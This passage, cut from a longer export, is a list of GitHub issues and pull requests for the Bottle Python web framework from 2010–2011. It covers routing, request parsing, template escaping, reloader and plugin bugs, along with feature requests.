This now results in a 303 redirect to http://<SERVER_NAME>:8080/, where formerly it resulted in http://127.0.0.1:8080/

My application is intended to be served on '127.0.0.1', but breaks if the host does not resolve its own host name to '127.0.0.1'.

No other host values appear to be treated specially, including other addresses in 127.0.0.x.
"
158,Fix broken link in docs.,2011-05-12T18:06:03Z,2011-05-13T20:33:36Z,,,,"Fix broken link. It may or may not be the right new link, I couldn't find any move operation, after docs dissapeared post- aacef68872b26dcda893cdefb739b763a0a802a1
"
157,Issue 92,2011-05-12T18:00:32Z,2011-05-12T18:15:49Z,,,,"Fixes #92
"
156,Fix broken link,2011-05-12T17:24:25Z,2011-05-12T18:05:36Z,,,,"Fix broken link. It may or may not be the right new link, I couldn't find any move operation, after docs.md disappeared post- aacef68872b26dcda893cdefb739b763a0a802a1
"
155,Reloader bug,2011-05-07T18:09:41Z,,,,,"Just noticed some strange things about reloader.
I have something like this in my code:

``` python
from bottle import run, route, static_file

@route('/test')
def test():
    return static_file('testfile', '.')

@route('/')
def index():
    return '<a href=test> Go to test </a>'

f = open('testfile', 'wb')
f.write('some text')
f.close()

run(reloader=True)
```

When I click on the link, then go back to main page and then modify my script, the reloader doesn't work properly and after the next request the traceback appears:

``` python
Exception happened during processing of request from ('127.0.0.1', 55094)
Traceback (most recent call last):
  File ""/usr/lib/python2.7/SocketServer.py"", line 284, in _handle_request_noblock
    self.process_request(request, client_address)
  File ""/usr/lib/python2.7/SocketServer.py"", line 310, in process_request
    self.finish_request(request, client_address)
  File ""/usr/lib/python2.7/SocketServer.py"", line 323, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File ""/usr/lib/python2.7/SocketServer.py"", line 639, in __init__
    self.handle()
  File ""/usr/lib/python2.7/wsgiref/simple_server.py"", line 116, in handle
    self.raw_requestline = self.rfile.readline()
  File ""/usr/lib/python2.7/socket.py"", line 447, in readline
    data = self._sock.recv(self._rbufsize)
KeyboardInterrupt
```

After that reloader stops working at all unless you restart the server manually.
"
154,Clean up MakoTemplate,2011-05-05T06:39:57Z,2011-05-05T11:11:08Z,,,,"I noticed that MakoTemplate currently does way too strange magic with regards to filenames, and even the comment says that it's a hack. So why not use uri and filename parameters, so uri is used for inherits/includes to work correctly, and filename is used to use the already found filename.
"
153,Cross-site scripting attacks,2011-05-03T16:28:55Z,2011-05-07T11:48:21Z,,,,"At the moment bottle doesn't seem to filter the user input passed via the dynamic routes which means that it's vulnerable cross-site scripting attacks. I think that the route(), get(), and post() decorators should automatically filter the input or additional decorator should be added (take a look at the gist).

https://gist.github.com/953622

P.S.: The reason I'm not using the cgi.escape() function inside the decorator is that it doesn't filter single quotes ( ' ).
"
152,fixed spelling typo: knowlage -> knowledge,2011-05-03T02:54:58Z,2011-05-03T09:21:08Z,,,,
151,"Create, test and document SQLite plugin",2011-05-02T18:15:55Z,2011-05-13T20:36:45Z,,,,"The (non-existent) SQLite plugin is often used as an example in the docs. We should either remove it from the docs or just implement it. I prefer the latter.
"
150,Copy editing.,2011-04-25T20:54:56Z,2011-04-25T22:53:46Z,,,,"Just a few tweaks here and there. Mostly with possessive form and capitalization of Bottle. Also took your advice and branched from your master. 
"
149,Discussion: Plugins and sub-applications.,2011-04-22T18:17:47Z,2011-04-25T20:03:47Z,Needs input,,,"Bottle can mount() applications onto a specific URL prefix.

```
from some_project import sub_application
root = Bottle()
root.mount(sub_application, '/prefix')
```

This creates a proxy-route on the main-application that relays all requests to the sub-application.

Plugins installed to the main-application can wrap the proxy-route, but cant wrap individual routes of the sub-application. They can only affect the sub-application as a whole (by wrapping the proxy-route), or must be explicitly installed to the sub-application as well. This seems to be confusing for new users.

I see two solutions do make things more clear.

a) Let `Bottle.mount()` disable all plugins by default. The dummy-route is created with `skip=True`. This way, it is absolutely clear that Plugins do not affect sub applications.

b) Add all plugins installed to the main-application to the list of plugins of the sub-application automatically.

Personally I prefer a) because it is easier to debug and more predictable. The downside is that there is (currently) no way for a plugin to say ""I want to affect sub-applications as well, because I am an important logging/auth/database plugin"".

Any ideas?
"
148,ssl proxy request url problems,2011-04-19T15:55:18Z,2011-05-07T16:16:17Z,,,,"Using Bottle with an SSL Proxy is causing me trouble. When I call `https://example-ssl-proxy.com/example.com/myfolder` the request.url has the value `http://example-ssl-proxy.com/myfolder`. The proxied domain name is lost and https becomes http.

Is this a bug in Bottle?
"
147,Total Fail: Request object has no attribute forms?,2011-04-19T14:38:41Z,2011-04-19T15:14:26Z,,,,"I ran the following:

from bottle import route, request, run

@route('/login')
def one():
&nbsp;&nbsp;&nbsp;&nbsp;return '''&lt;form method=""POST""&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;input name=""usrin"" type=""text"" /&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/form&gt;'''

@route('/login', method=""POST"")
def two():
&nbsp;&nbsp;&nbsp;&nbsp;usrin = request.forms.get('usrin')
&nbsp;&nbsp;&nbsp;&nbsp;return 'you entered &lt;h1&gt;' +usrin+ '&lt;/h1&gt;'

run(host='localhost', port=8080)

It started up fine and I got the form, but when I submit anything the POST handler fails with:

---

Error 500: Internal Server Error

Sorry, the requested URL /login caused an error:

```
        Unhandled Exception: AttributeError(""'Request' object has no attribute 'forms'"",)
```

---

Any help would be great.

I also found that it will not import get or import post modules so I guess it hasn't installed properly, but I installed it using synaptic on Ubuntu 10.4. Any ideas please? I'd really like to use this framework.

I'm going to have a dig about and see if I can get a newer version of Bottle or something. At a bit of a loss at the mo.
"
146,redirect doesn't work sometimes on IE6,2011-04-19T02:47:27Z,2011-04-21T05:29:00Z,Needs input,,,"I try to redirect in the @post method,  it works fine on chrome browser, but not so good on IE6.

It's not always fail, but sometimes redirect doesn't work and the page still retain on the post page when the user's

browser is IE6.0.

It may be solved by persuade all of my users to change their browser to chrome, but not so good a solution.

Hope to find the answer, thanks.
"
145,UnicodeEncodeError in default 404-page -- when using non-ascii-characters in URL,2011-04-12T21:37:38Z,2011-04-13T11:14:11Z,Bug,UnicodeEncodeError,UnicodeEncodeError: 'ascii' codec can't encode characters in position 842-846: ordinal not in range(128),"UnicodeEncodeError in default 404-page -- when using **non-ascii-characters in URL**

in bottle version ""bottle-0.8.5""

Traceback:

```
Traceback (most recent call last):
  File ""/var/www/newsroru/data/.local/lib/python2.7/site-packages/bottle.py"", line 582, in __call__
  File ""/var/www/newsroru/data/.local/lib/python2.7/site-packages/bottle.py"", line 537, in _cast
UnicodeEncodeError: 'ascii' codec can't encode characters in position 842-846: ordinal not in range(128)
```

http://ompldr.org/vODhtaA/Screenshot.png
"
144,Copy Editing,2011-04-11T20:36:06Z,2011-04-11T21:42:29Z,,,,"Just some copy changes to make things a bit more clear. 
"
143,inline argument to static_file(),2011-04-10T17:53:27Z,2011-05-07T16:18:41Z,,,,"I want the files that I serve via static_file() to open inside the browser (i.e. not force a download), however, if the user chooses to save the file, I want to set the default filename. The way to achieve this is by setting Content-Disposition header to ""inline; filename=..."". The commit adds inline argument to static_file(), which sets the header appropriately.
"
142,Added a recipe for keep-alive requests,2011-04-07T16:50:18Z,2011-04-07T17:20:35Z,,,,"Works with gevent and paste servers.
"
141,SimpleTemplate: need to improve automatic HTML-escaption,2011-04-04T18:50:28Z,2011-08-30T17:06:24Z,Request,,,"SimpleTemplate: need improve automatic escaption

using cgi.escape() -- not fully sufficiently -- for HTML-escaping

example:

```
$ python 
Python 2.6.6 (r266:84292, Sep 15 2010, 15:52:39) 
[GCC 4.4.5] on linux2 
Type ""help"", ""copyright"", ""credits"" or ""license"" for more information.
>>> from bottle import SimpleTemplate
>>> print SimpleTemplate('<meta name=""description"" content=""{{description}}"" />').render({'description': 'Hello, ""World""!'})
<meta name=""description"" content=""Hello, ""World""!"" />
>>> 
```

as a workaround solution -- is of course possible to use the following recipe:

```
>>> 
>>> from xml.sax.saxutils import quoteattr
>>> print SimpleTemplate('<meta name=""description"" content={{! q(description) }} />').render({'q': quoteattr, 'description': 'Hello, ""World""!'})
<meta name=""description"" content='Hello, ""World""!' />
>>> 
```

...but if the automatic HTML-escaping would work fully, it would be easier

thanks in advance!
## 

Andrej
"
140,Fix syntax error in tests,2011-04-02T17:13:57Z,2011-04-07T15:51:33Z,,,,"I think Python 2.5 prefers named parameters, then the _args and *_kwargs, when calling a function.

```
Traceback (most recent call last):
File ""/Users/scollins/Programming/bottle/test/testall.py"", line 38, in <module>
suite = unittest.defaultTestLoader.loadTestsFromNames(test_names)
File ""/System/Library/Frameworks/Python.framework/Versions/2.5/lib/python2.5/unittest.py"", line 565, in loadTestsFromNames
suites = [self.loadTestsFromName(name, module) for name in names]
File ""/System/Library/Frameworks/Python.framework/Versions/2.5/lib/python2.5/unittest.py"", line 533, in loadTestsFromName
module = __import__('.'.join(parts_copy))
File ""/Users/scollins/Programming/bottle/test/test_plugins.py"", line 167
return func(*a, test='me', **ka) + '; tail'
                   ^
```
"
139,Handling multiple post values,2011-04-01T22:42:59Z,2011-04-01T22:49:49Z,,,,"Bottle doesn't seem to be handling multiple values of a single post variable (as in a multiple select).

The current code says:

```
self.environ['bottle.post'][item.name] = item.value
self.environ['bottle.forms'][item.name] = item.value
```

This will cause each successive value to just overwrite the last. 

The following will create and populate a list as necessary:

```
if item.name in self.environ['bottle.post']:
    if not type(self.environ['bottle.post'][item.name]) == list:
        self.environ['bottle.post'][item.name]  = [self.environ['bottle.post'][item.name]]
    self.environ['bottle.post'][item.name].append(item.value)
else:
    self.environ['bottle.post'][item.name] = item.value

if item.name in self.environ['bottle.forms']:
    if not type(self.environ['bottle.forms'][item.name]) == list:
        self.environ['bottle.forms'][item.name]  = [self.environ['bottle.forms'][item.name]]
    self.environ['bottle.forms'][item.name].append(item.value)
else:
    self.environ['bottle.forms'][item.name] = item.value
```
"
138,Fix incorrect word usage.,2011-03-31T04:21:15Z,2011-03-31T10:48:36Z,,,,"Found it on the site while reading the Tutorial. Otherwise, awesome framework and awesome documentation. 
"
137,Fix building query string in routes,2011-03-20T22:40:50Z,2011-03-20T22:59:03Z,,,,"Fixes #136 with a test
"
136,The use of quote_plus is a bug,2011-03-20T22:25:35Z,2011-03-20T23:03:47Z,,,,"There's an import of quote_plus from urllib and it's later used in building route urls for encoding leftover keyword arguments as query arguments. This is probably a mistake or a typo, since quote_plus is meant to be used for encoding strings, not sequences, and probably doesn't do what it was meant to do judging by the code (i.e. adding arguments as a query string).

The only reason it wasn't failing with exceptions is because first thing quote_plus does is searching for ' ' within it's argument, exhausting the iterator, so later quote checks if it's argument is ""empty"" and because there are no elements left in the iterator it thinks it's an empty string and always returns empty string as a result.

The proper function to use there is urllib.urlencode, since that is the function that takes a dictionary or a sequence of (name, value) tuples and transforms it to a query string.

The patch is very simple:

<pre>
diff --git a/bottle.py b/bottle.py
index e7156de..cb2761c 100755
--- a/bottle.py
+++ b/bottle.py
@@ -39,7 +39,7 @@ import warnings
 from Cookie import SimpleCookie
 from tempfile import TemporaryFile
 from traceback import format_exc
-from urllib import quote_plus as urlquote
+from urllib import urlencode
 from urlparse import urlunsplit, urljoin
 
 try: from collections import MutableMapping as DictMixin
@@ -293,7 +293,7 @@ class Router(object):
         except KeyError, e:
             raise RouteBuildError(*e.args)
 
-        if args: url += ['?', urlquote(args.iteritems())]
+        if args: url += ['?', urlencode(args)]
         return ''.join(url)
 
     def match(self, environ):
</pre>
"
135,The use of quote_plus might be a bug,2011-03-20T22:09:04Z,2011-03-20T22:22:27Z,,,,"There's an import of quote_plus from urllib and it's later used in building route urls for encoding leftover keyword arguments as query arguments. This is probably a mistake or a typo, since quote_plus is meant to be used for encoding strings, not sequences, and probably doesn't do what it was meant to do judging by the code (i.e. adding arguments as a query string).

The proper function to use there is urllib.urlencode, since that is the function that takes a dictionary or a sequence of (name, value) tuples and transforms it to a query string.

The patch is very simple:

<pre>
diff --git a/bottle.py b/bottle.py
index e7156de..cb2761c 100755
--- a/bottle.py
+++ b/bottle.py
@@ -39,7 +39,7 @@ import warnings
 from Cookie import SimpleCookie
 from tempfile import TemporaryFile
 from traceback import format_exc
-from urllib import quote_plus as urlquote
+from urllib import urlencode
 from urlparse import urlunsplit, urljoin
 
 try: from collections import MutableMapping as DictMixin
@@ -293,7 +293,7 @@ class Router(object):
         except KeyError, e:
             raise RouteBuildError(*e.args)
 
-        if args: url += ['?', urlquote(args.iteritems())]
+        if args: url += ['?', urlencode(args)]
         return ''.join(url)
 
     def match(self, environ):
</pre>
"
134,Add gettext support (localization) to the documentation.,2011-03-09T10:48:14Z,,,,,"Sphinx supports gettext and a spanish translation is already maintained by sgala (muchos gracias, by the way). It would be great to officially support other languages. I could work on a german translation, for example.
"
133,Formarcel,2011-03-03T17:15:38Z,2011-03-03T18:27:12Z,,,,"This adds Content-Length for dict2json output, enabling HTTP/1.1 persistent connections.

A similar patch can be written easily for the plugins2 branch, tell me if you are interested in me doing it.

Regards
Santiago
"
132,cookies secret keyword,2011-03-02T04:50:08Z,2011-03-02T11:35:41Z,,,,"I'm scared about the 'secret' keyword in get_cookies and set_cookies. A 'secret' keyword induces people to think about encrypted cookies, but it is not true.

What you think about changing 'secret' keyword to 'signature' or something like that? I guess it will be a bit safer and will avoid misuse of this ""secret cookie"". This keyword is to make a signed cookie, not a secret cookie.

Sometimes people just read part of documentation, not the last line warning about what not to do.
"
131,Random recursion error on static_file(),2011-02-21T12:21:10Z,2011-03-02T19:36:52Z,,,,"static_file doesn't take a root argument then causes a recursion error.
"
130,Some headers not in request.headers dict.,2011-02-20T00:01:45Z,2011-04-17T15:42:23Z,Bug,,,"Some headers are not stored as `HTTP_*` values in the environ dictionary, but have special names (e.g. `CONTENT_TYPE`). These are missing in the `request.headers` dict.
"
129,Multipart xhr requests are often unusable from bottle,2011-02-15T15:24:48Z,2011-02-17T12:55:36Z,,,,"Bottle probably makes a bad usage of cgi.FieldStorage:

In POST handler, only environ is passed to FieldStorage, headers are just ignored (but they contain some vital part).

This leads to buggy POST request, for instance, if you make a test using http://valums.com/ajax-upload/ you will get _nothing_ in ""POST"" or ""files"".

The posted file in request have several issues: it lacks a filename so it's not considered as a file.
Btw, if the filename is given (with a quick hack, since it ignores the headers for now, I hacked code to get ""content-disposition"" header passed) , then the behavior is totally wrong in FieldStorage too, that's because if you start handling headers, you can't rely on ""automatic headers"" of FieldStorage anymore.
"
128,GET / POST doesn't return multiple values,2011-02-12T22:02:41Z,2011-02-15T04:11:19Z,,,,"In a 'request.GET.get' call or 'request.POST.get' call, if an HTML name was already loaded into the _GET / self.environ['bottle.post'][item.name] MultiDicts, the new value overwrites it.  I think instead it should turn it into a list (so that you could return multiple values for HTML 'name's with the same value).
"
127,Fix a typo in the tutorial,2011-02-06T12:24:58Z,2011-02-19T04:10:39Z,,,,
126,bjoern & tornado won't pass correct parameters to routing function,2011-02-05T11:45:09Z,2011-02-18T20:30:32Z,,,,"Given some routing rule like:

```
@route(""/:objpath#.+#"", method=['GET', 'POST'])
def glob_index(objpath=""/""):
    print objpath
```

With bjoern & tornado (not all servers tested), if there is an escaped element (like space), it will be passed in the encoded format (like %20) instead of plain one.

This makes different backends behave differently even for basic routing...
Know to work ""as expected"": paste, gevent, rocket, fapws3
"
124,TODO: App-specific templates and send_file settings.,2011-01-24T13:00:13Z,,,,,"Currently, templates are handled globally. This makes it hard to add app-specific helper functions to the template namespace when mounting additional apps.

Templates should be handled by the application object or at lease get their configuration from there. Same goes for `static_file()` helper. The root-path should be configurable at application-level.
"
123,TODO: A way to integrate WebOB/werkzeug,2011-01-24T12:51:10Z,2011-05-13T20:35:45Z,,,,"It would be nice to be able to use the Request and Response classes provided by WebOb and/or werkzeug instead of the bundled ones. Optional of cause (no hard dependencies). This decision should be app-specific and not global, so different apps can use their favorite request/response implementations. The objects should still be accessible as a global variable. In other words, bottle.request and bottle.response should proxy attribute accesses to the thread-local instances of the current application, instead of being a thread-local instance.

1) Remove any use of implementations-specific APIs from the core. This is mostly done.
2) Use WSGI to call sub-applications and do not create or bind request or response objects if the request is targeted at a sub-application. This is to prevent redundant work.
3) Store thread-local instance of the configured Request and Response implementation as an application attribute and make bottle.request and bottle.reponse proxy to the corresponding instance at the current application. 
"
122,TODO: HTTPResponse should subclass Response.,2011-01-24T11:39:48Z,2014-10-22T19:58:43Z,,,,"`Response` has no documented `__init__` API and `HTTPResponse` has no documented API at all. Should be easy to merge these two.

```
Response
|-LocalResponse (threading.local)
|-HTTPResponse (Exception)
  |- HTTPError
```
"
121,Copyright link in the footer of some web pages is incorrect,2011-01-21T10:15:54Z,2011-01-21T19:07:06Z,,,,"e.g the copyright link in those pages
http://bottle.paws.de/docs/dev/tutorial.html#getting-started
http://bottle.paws.de/docs/dev/faq.html

It's typed as http://bottle.paws.de/docs/dev/index.htmllicence
It should be http://bottle.paws.de/docs/dev/index.html#licence
"
120,HTML minifcation in SimpleTemplate (request),2011-01-15T01:29:42Z,2011-01-18T02:09:18Z,,,,"Would it be possible to include HTML minification option for SimpleTemplate?

Something along the lines of 

```
bottle.SimpleTemplate.minify_html = True # or `False`, and `not bottle.DEBUG` by default
```

Alternatively (since templates may not necessarily be HTML documents):

```
%minify_output

%end <-- optional?
```

There's a [script](http://bugs.python.org/file12183/minify.py) that does that kind of stuff.
"
119,[improvments] Remove http code-to-message mapping in base.py,2011-01-06T15:17:44Z,2011-01-06T15:52:27Z,,,,"You don't have to maintain the code-msg mapping because there is a function in httplib:

```
httplib.responses(200)
```
"
118,Method POST not working,2011-01-03T13:06:58Z,2011-01-18T00:30:52Z,,,,"I am working with the Todo-List application in the tutorial for bottle.
It works fine with the GET-method, but when i change to POST i get the following error-message on the browser screen (Iceweasel):

Error 405: Method Not Allowed
Sorry, the requested URL http://localhost:8080/new caused an error:
Method not allowed.

I am working on a Debian sid system with also running a apache 2 for PHP-Applications and there is no problem with POST. Is there a setup-possibility for the bottel internal webserver to allow using POST?
"
117,Misleading error message when calling url() with wrong arguments,2010-12-27T01:01:40Z,2010-12-28T18:26:15Z,Bug,,,"When the named parameters in the route definition do not match the arguments supplied to url() function, the error message tells me that a route with a specified name does not exist. This is misleading, and should probably be fixed if possible.
"
116,Dangling footnote in FAQ page,2010-12-25T23:21:13Z,2010-12-28T17:59:46Z,,,,"http://bottle.paws.de/docs/dev/faq.html#dynamic-routes-and-slashes

I'm guessing the reference to RCF was made as a reminder that URIs are unique, and that optional slashes are not desirable, or something like that?
"
115,Add bjoern server adapter,2010-12-25T11:35:16Z,2010-12-29T01:35:52Z,,,,
114,Use HTTPS for GitHub everywhere,2010-12-25T11:33:42Z,2010-12-28T17:35:51Z,,,,"See recent GitHub broadcasts for explanation.
"
113,Named routes not working when using Bottle class,2010-12-25T00:35:44Z,2010-12-28T18:12:15Z,,,,"I might be wrong, but I can't see where the `name` argument is used when using `Bottle.route()` as decorator. Using the `url()` helper raises exceptions like:

```
RouteBuildError(""No route found with name 'route_name'."",)
```

Replacing `Bottle.route()` decorator with plain `route()` decorator works.

Sorry, forgot to mention, I'm using commit 51c37fc68a8bb8004b0409c9bf9796d51df05f64
"
112,OverflowError in bottle's parse_date,2010-12-23T21:16:15Z,2010-12-28T18:19:22Z,Bug,OverflowError,OverflowError: mktime argument out of range,"I was browsing my server in Google Chrome, when suddenly I started getting `Internal Server Error`. Turns out that Google Chrome was sending `If-Modified-Since:Thu, 1 Jan 1970 00:00:00 GMT`. I don't know why Google Chrome is doing that (it strangely only happened on one of Cappuccino's `Info.plist` files), but in my timezone (Moscow Time) it results in this:

<pre>
  File ""C:\Python26\lib\site-packages\bottle-0.8.4-py2.6.egg\bottle.py"", line 499, in handle
    return handler(**args)
  File ""****\server\main.py"", line 609, in public
    return bottle.static_file(filename, root=public_path)
  File ""C:\Python26\lib\site-packages\bottle-0.8.4-py2.6.egg\bottle.py"", line 1066, in static_file
    ims = parse_date(ims)
  File ""C:\Python26\lib\site-packages\bottle-0.8.4-py2.6.egg\bottle.py"", line 1094, in parse_date
    return time.mktime(ts[:8] + (0,)) - (ts[9] or 0) - time.timezone
OverflowError: mktime argument out of range
</pre>

I think `parse_date` needs to include `OverflowError` as well, at least that's what I'm doing locally for the time being.
"
111,Proposal: @viewdoc for rendering docstring as template,2010-12-20T10:54:00Z,2011-05-13T20:46:48Z,,,,"I think a decorator  @viewdoc for rendering docstring as template is really handy for small projects, it will be used like this:

```
import controls

@get('/index')
@viewdoc
def index():
     """"""
    <title>hello</title>
    % for msg in controls.get_all_messages():
         {{ msg.date }} {{ msg.body }}<br />
    % end
    """"""
```

and the implementation of @viewdoc is really simple:

```
def viewdoc(handler):
    def decorated():
        return template(handler.__doc__, **globals())
    return decorated
```

with this feature we can develop web apps inside one standalone file. also, no time loss for template file seeking.

more in advance, we can turn handler into named template, it's even more flexible than PHP.

I use @viewdoc in my small GAE app and it works well.

this is a draft, welcome to discuss.

btw, @view without template name can be a way to use @viewdoc
"
110,a decorator for http parameters checking,2010-12-18T18:39:39Z,2011-06-23T20:39:46Z,Request,,,"Hi!
I'd like share some piece of code I wrote this morning.   Please let me know if this has been done before or you know how to do it better.

https://gist.github.com/746706

This decorator is very useful when writing an API server with bottle.  With this decorator, I saved  large amount of redundant code on parameter checking.
"
109,Cannot use different names for the same route,2010-12-17T21:42:50Z,2011-01-21T21:48:20Z,Bug,,,"Hi,

I'm not sure if this is a bug (most likely not) just a behavior that got me surprised when I first encountered it, so I'd like to know if this behavior is really expected or maybe it should be fixed. For example, consider this code:

```
import bottle

@bottle.get('/files', name='list_files')
def list_files():
    pass

@bottle.post('/files', name='upload_file')
def upload_file():
    pass

bottle.app().routes.compile()
print bottle.app().routes.named.keys()
```

As you can see there are two functions: `list_files` and `upload_file`, both mapped to the same route `/files`. However, since `Bottle.route` uses a route that was previously defined, there will be only one named route: `list_files`. Named route `upload_file` is not defined.

Now why this surprised me: I had a view that used `{{bottle.url('upload_file')}}` for form's action and obviously it didn't work. Since then I'm naming `list_files` and `upload_file` routes simply `files`, but of course it's not very ideal. For example, if I later decide to start using `/files/upload` then I'd obviously have to rename the route as well, which kind of defeats the purpose of named routes.

I understand this might have performance implications, but would it be feasible to make `Route.name` an optional `set` or `list`, so that `Bottle.route` sniffs `kargs` for `name` and adds it to the existing route?

The patch is fairly easy to do, I'm just wondering if supporting multiple route names is the way to go.
"
108,Digits cannot be used in route parameter names,2010-12-13T20:46:51Z,2010-12-17T22:09:26Z,Request,,,"Things like ""files/md5/:md5"" and ""files/sha1/:sha1"" in routes are not accepted right now, which was very puzzling at first since md5 and sha1 should be valid identifiers (forced me to use mdfive and shaone for now, which works but is not pleasant). Please add support for those, e.g.:

```
diff --git a/bottle.py b/bottle.py
index 9334344..19af4e0 100755
--- a/bottle.py
+++ b/bottle.py
@@ -169,7 +169,7 @@ class RouteBuildError(RouteError):

 class Route(object):
     ''' Represents a single route and can parse the dynamic route syntax '''
-    syntax = re.compile(r'(?<!\\):([a-zA-Z_]+)?(?:#(.*?)#)?')
+    syntax = re.compile(r'(?<!\\):([a-zA-Z_][a-zA-Z0-9_]*)?(?:#(.*?)#)?')
     default = '[^/]+'

     def __init__(self, route, target=None, name=None, static=False):
```

Would be especially nice if this could be fixed in 0.8 as well. Thanks!
"
107,Helper functions for templates,2010-11-10T19:50:46Z,2011-01-24T12:51:52Z,,,,"I've been looking over the docs and I can't find a way to make helper functions available within templates.  For example, I have a ""url"" function that I'd like to use like so:

&lt;a href=""{{ url('/test/path') }}""&gt;Click Me&lt;/a&gt;

(the idea here is to prefix the full path of the bottle app, no matter if it is mounted at ""/"" or ""/mybottleapp/"")

Is there already a provision for helper functions?
"
106,Small docs fix,2010-11-05T00:46:51Z,2010-11-11T17:19:55Z,,,,
105,SQLitePlugin should warn if callback don't accept a db keyword,2010-10-24T18:13:36Z,2010-10-25T00:14:53Z,,,,"If whe wrapped function don't accept a 'db' keyword (or other defined value), SQLitePlugin silently return the function without inject db parameter.

This case is probably a programming error, but it is very dificult to see if Bottle don't send some warning or error.
"
104,Query string parameters without any value not accessible from request.GET,2010-10-22T19:17:27Z,2010-10-25T12:25:23Z,,,,"There doesn't seem to be any easy way to see whether a value-less query string parameter simply exists.

For a request to ""http://www.example.com/home?something""

```
if request.GET.get('something'):
  do_something()
```

doesn't work since 'something' isn't added to the MultiDict since it doesn't have any values.

Maybe a `has(value)` method on MultiDict would be appropriate?
"
103,Make DictMixins usable with @view,2010-10-07T21:34:51Z,2010-10-10T03:32:46Z,,,,"(sorry for the duplicate pull request; this is an amendment of the botched first copy)

Hi Marcel,

My app is currently running on bottle 0.8.0 and returns a DictMixin subclass to the @view decorator. I upgraded to bottle 0.8.3 today and that functionality broke. After adding DictMixin to the isinstance check in @view, everything looks and works great.

Is there any way you could also drop this into 0.8.4 if you do another bugfix release?

Regards,
Brandon Gilmore
"
102,Fix for using @view with a UserDict,2010-10-07T21:25:36Z,2010-10-07T21:30:14Z,,,,"Hi Marcel,

My app is currently running on bottle 0.8.0 and returns a UserDict subclass to the @view decorator. I upgraded to bottle 0.8.3 today and that functionality broke. After adding UserDict to the isinstance check in @view, everything looks and works great.

Is there any way you could also drop this into 0.8.4 if you do another bugfix release?

Regards,
Brandon Gilmore
"
101,PUT vars are not populating .forms or .params,2010-09-24T02:43:14Z,2011-01-01T14:14:48Z,Request,,,"There's some confusion in the parsing of POST variables and it seems PUT vars are getting overlooked.
"
100,Add SimpleTAL templates,2010-09-21T14:29:13Z,2010-09-25T23:50:35Z,Request,,,"I wanted to use [SimpleTAL templates](http://www.owlfish.com/software/simpleTAL/) in Bottle for some quick prototyping. Here is the bit of code I used. I'm not sure if it's fully correct, and it needs the equivalent View handling. 

```
from bottle import BaseTemplate
from bottle import TEMPLATE_PATH
from bottle import template
import functools

class SmpleTALTemplate(BaseTemplate):
    def prepare(self, **options):
        from simpletal import simpleTAL

        # TODO: add option to load METAL files during render

        if self.source:
            self.tpl = simpleTAL.compileHTMLTemplate (self.source)
        else:
            templateFile = open (self.filename, 'rt')
            self.tpl = simpleTAL.compileHTMLTemplate (templateFile)
            templateFile.close()

    def render(self, *args, **kwargs):
        from simpletal import simpleTALES
        from StringIO import StringIO
        for dictarg in args: kwargs.update(dictarg)

        # TODO: maybe reuse a context instead of always creating one
        context = simpleTALES.Context()
        for k,v in self.defaults.items():
            context.addGlobal(k, v)
        for k,v in kwargs.items():
            context.addGlobal(k, v)

        output = StringIO()
        self.tpl.expand (context, output)

        return [output.getvalue()]

simpletal_template = functools.partial(template, template_adapter=SmpleTALTemplate)
```
"
99,Plugins,2010-09-14T23:21:14Z,2010-11-11T17:16:49Z,,,,"Hello Marcel,

Long time I didn't bother you with my mails :D

I just wanted to tell you I made a plugin for ""on the fly"" gzip compression and it's available on babs/bottle/plugins.
I plan to add few aditions to it (ability to disable compression for some cases, caching maybe etc...)

Can you tell me what you think about it and if you had it to your branch.

Just a little bug I spotted about the 'install' fct:
if I load the plugin via the following way, it works:
    from bottle_otfcompress import OtfCompressPlugin
    bottle.install(OtfCompressPlugin)
but using the other way you provide:
    bottle.install(""otfcompress"")
I got the following traceback (idem with sqlite plugin demo, and I admit I'm a bit lost here):
    Traceback (most recent call last):
      File ""startbottle.py"", line 207, in <module>
        sys.exit(main(sys.argv[1:]))
      File ""startbottle.py"", line 177, in main
        **import**(mod)
      File ""./dummy.py"", line 7, in <module>
        bottle.install(""otfcompress"")
      File ""/home/babs/devel/python/bottle/bottle.py"", line 1467, in wrapper
        return getattr(app(), name)(_a, *_ka)
      File ""/home/babs/devel/python/bottle/bottle.py"", line 378, in install
        plugin = plugin_names[name]
    KeyError: 'uninstall'

Regards,
Damien
"
98,autojson doesn't work on GAE,2010-09-13T22:26:41Z,2010-09-14T09:47:21Z,Request,,,"python2.5 doesn't include json, so to get access to the simplejson module you need the following line:

from django.utils.simplejson import dumps as json_dumps
"
97,Template args not passed from view() to template() properly,2010-09-12T14:35:28Z,2010-09-13T08:37:22Z,Bug,,,"Trying to use mako_view, I was getting syntax errors.  Some investigation showed that the wrapper() function defined inside view() was returning

```
return template(tpl_name, tplvars)
```

instead of

```
return template(tpl_name, **tplvars)
```

This was causing the 'template_adapter' kwarg to not be present and SimpleTemplate to be used instead.
"
96,Pull request,2010-09-08T07:21:34Z,2010-09-13T08:40:14Z,,,,"Patch already sent to the mailing list :)

Hope you merge it!
"
95,how can i give user a replace page for error occured?,2010-09-05T11:18:17Z,2010-09-05T16:27:04Z,,,,"currenty we only can use bottle.app().catchall=False
and then give user some info like
a server error occurred.please contact the administrator
how can i replace above with my custom beauty pag?
"
94,GAE performance,2010-08-27T19:24:17Z,2011-01-21T21:48:42Z,Request,,,"The problem with GAE is that Bottle is optimized for long-running processes. The router for example spends a lot of time compiling and optimizing routes to speed up requests, but when running on GAE, all these optimizations are thrown away after the first request.

To address this, I am working on a new router implementation that does not optimize or precompile and is better suited for GAE.
"
93,Use functools.partial instead of lambda,2010-08-24T07:45:04Z,2010-08-27T18:35:15Z,Request,,,"The functools.partial() wrapper is implemented in C and faster than most lambda constructs.

```
>>> min(timeit.repeat('f(""ä"")','import functools\nf = lambda x: unicode(x, encoding=""utf-8"")'))
0.63631319999694824
>>> min(timeit.repeat('f(""ä"")','import functools\nf = functools.partial(unicode, encoding=""utf-8"")'))
0.44298005104064941
```

Bottle should favor functools.partial() over lambda (especially in templates).
"
92,Request for gzip Compression for HTML / CSS / JS,2010-08-20T17:02:05Z,2011-05-12T18:16:37Z,"Request, Undecided",,,"I'd like to see optional gzip compression in Bottle, mainly because I have some bigger static JavaScripts in my project. If you reject this request, maybe you could give me a hint where it would be best to add this functionality?

Thanks in advance.

Thomas
"
